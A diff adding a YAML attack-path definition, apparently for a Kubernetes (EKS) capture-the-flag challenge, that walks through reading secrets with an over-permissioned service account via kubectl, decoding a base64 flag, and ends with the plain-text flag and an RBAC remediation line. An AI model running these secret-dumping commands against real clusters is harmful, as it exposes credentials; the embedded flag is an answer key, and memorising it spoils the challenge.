@@ -1,0 +1,43 @@
+attack:
+  name: "Secret Seeker - EKS Over-Privileged Secret Access"
+  description: "Attack path exploiting over-permissioned service account to read secrets in namespace"
+
+  variables:
+    - name: challenge_namespace
+      value: "challenge1"
+    - name: secret_name
+      value: "log-rotate"
+
+  steps:
+    - id: 1.0
+      name: "Test cluster-wide secret read permission"
+      command: "kubectl get secrets --all-namespaces -o yaml"
+      tags: ["rbac", "discovery"]
+      on_success:
+        - next: 2.0
+      on_failure:
+        - next: 1.1
+
+    - id: 1.1
+      name: "Fallback: try reading secrets in namespace"
+      command: "kubectl get secret -n ${challenge_namespace}"
+      on_success:
+        - next: 1.2
+      on_failure:
+        - fail: "Insufficient permissions to list secrets in namespace"
+
+    - id: 1.2
+      name: "Read known secret manifest"
+      command: "kubectl get secret ${secret_name} -n ${challenge_namespace} -o yaml"
+      tags: ["secret", "eks"]
+      on_success:
+        - next: 1.3
+      on_failure:
+        - fail: "Secret not accessible"
+
+    - id: 1.3
+      name: "Base64 decode secret flag value"
+      command: "echo \"d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==\" | base64 -d"
+      on_success:
+        - capture_flag: "wiz_eks_challenge{omg_over_privileged_secret_access}"
+        - remediate: "Restrict service account RBAC to avoid secret access"
